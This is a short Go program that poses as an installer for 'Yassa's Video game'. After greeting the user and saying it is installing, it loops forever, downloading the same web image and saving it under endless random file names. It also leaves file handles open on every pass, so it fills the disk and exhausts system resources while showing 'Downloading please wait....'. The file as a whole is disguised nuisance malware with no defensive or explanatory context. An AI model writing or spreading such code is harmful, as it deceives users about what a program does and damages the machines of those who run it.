package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"strconv"
)

func main(){
    fmt.Println("Welcome to Yassa's Video game")
    fmt.Println("Hi there what is your name")
    var name string
    fmt.Scanln(&name)
    fmt.Println("Welcome "+name+" please wait while we are installing")
    create_image()
}


func create_image(){
    for true{
        url:= "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
        response, err := http.Get(url)
        if err!=nil{
            panic(err)
        }
        defer response.Body.Close()
        name:= rand.Int()
        file,err := os.Create(strconv.Itoa(name)+".jpg")
        if err!=nil{
            panic(err)
        }
        defer file.Close()
        _,err = io.Copy(file,response.Body)
        if err != nil{
            panic(err)
        }
        fmt.Println("Downloading please wait....")
    }   
}